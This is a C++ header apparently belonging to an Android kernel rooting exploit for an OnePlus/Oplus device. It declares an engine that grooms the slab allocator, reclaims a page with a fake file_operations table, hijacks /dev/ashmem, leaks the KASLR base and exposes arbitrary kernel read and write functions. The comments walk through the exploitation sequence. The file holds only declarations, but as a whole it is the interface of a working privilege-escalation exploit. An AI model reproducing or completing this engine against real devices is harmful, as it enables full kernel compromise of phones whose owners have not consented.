//
// page_engine.h — fake-page reclaim engine + arbitrary kernel R/W
// (port of the Payload's src/61 architecture; see page_engine.cpp).
//
#ifndef ROOT_OPLUS_ACE5_PAGE_ENGINE_H
#define ROOT_OPLUS_ACE5_PAGE_ENGINE_H

#include <cstdint>
#include <cstddef>

namespace pe {

// KernelSnitch + mm-slab grooming + skb reclaim. Fills the fake page.
// Returns false after exhausting attempts (safe to retry in a new run).
bool prepare_page();

// One-fire parameters: paint VALUE=fake_fops, word8=fake_task,
// word9=fake_lock; the fire target is get_misc_fops_alias().
uint64_t get_fake_fops();
uint64_t get_fake_lock();
uint64_t get_fake_task();
uint64_t get_misc_fops_alias();

// After the fire landed: opens /dev/ashmem (f_op = fake table), verifies
// the swap, self-tests the R/W channel. Returns the fd or -1.
int try_rw();

// KASLR + fake-table function-pointer refresh (needs R/W armed).
bool leak_kernel_base();
bool refresh_fake_fops_text();

// Arbitrary kernel R/W (valid after try_rw(); kread/kwrite take any
// kernel address).
bool kread(uint64_t target, void *buf, size_t len);
bool kwrite(uint64_t target, const void *buf, size_t len);
uint64_t kernel_read64(uint64_t target);
bool kernel_write64(uint64_t target, uint64_t value);

uint64_t get_kaslr_base();
uint64_t get_ashmem_fops_img_off();
void set_skb_delta(int64_t delta);    // skb geometry probe (per attempt)
uint64_t get_zero_slot(int n);        // harmless fire target for probing
uint64_t get_init_task_img_off();     // image offset of init_task
void set_kaslr_base(uint64_t base);   // BEFORE prepare_page: the fake fops
                                      // table must carry slid text pointers,
                                      // misc_open calls ->open immediately
void adopt_page(uint64_t fops, uint64_t lock, uint64_t task);  // hybrid:
                                      // adopt the engine-leaked page words

}  // namespace pe

#endif  // ROOT_OPLUS_ACE5_PAGE_ENGINE_H
